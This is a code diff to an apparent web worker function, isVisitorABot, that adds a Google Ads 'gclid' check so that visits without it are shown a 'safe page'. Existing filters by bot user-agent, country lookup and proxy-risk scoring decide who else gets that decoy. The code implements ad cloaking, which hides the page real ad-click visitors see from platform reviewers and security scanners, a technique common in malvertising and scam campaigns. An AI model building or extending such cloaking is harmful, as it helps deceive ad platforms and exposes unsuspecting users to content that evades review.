@@ -949,9 +949,16 @@ async function handleRequest(request) {
 async function isVisitorABot(request) {
   const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
   const userAgent = request.headers.get('User-Agent') || '';
+  const url = new URL(request.url);
   
   try {
-    // STEP 0: Quick user agent pattern check (fastest)
+    // STEP 0: Check for gclid parameter (Google Ads traffic)
+    const gclid = url.searchParams.get('gclid');
+    if (!gclid) {
+      return true; // Show safe page for direct visits without gclid
+    }
+
+    // STEP 1: Quick user agent pattern check (fastest)
     const userAgentLower = userAgent.toLowerCase();
     for (let i = 0; i < BOT_USER_AGENTS.length; i++) {
       if (userAgentLower.includes(BOT_USER_AGENTS[i])) {
@@ -959,7 +966,7 @@ async function isVisitorABot(request) {
       }
     }
 
-    // STEP 1: Quick geo check with ip-api.com
+    // STEP 2: Quick geo check with ip-api.com
     const geoRes = await fetch('https://ip-api.com/json/' + clientIP + '?fields=countryCode');
     if (geoRes.ok) {
       const geo = await geoRes.json();
@@ -970,7 +977,7 @@ async function isVisitorABot(request) {
       }
     }
 
-    // STEP 2: Risk assessment with proxycheck.io
+    // STEP 3: Risk assessment with proxycheck.io
     const pcUrl = 'https://proxycheck.io/v2/' + clientIP + '?key=' + PROXYCHECK_API_KEY + '&risk=1';
     const response = await fetch(pcUrl);
     const data = await response.json();
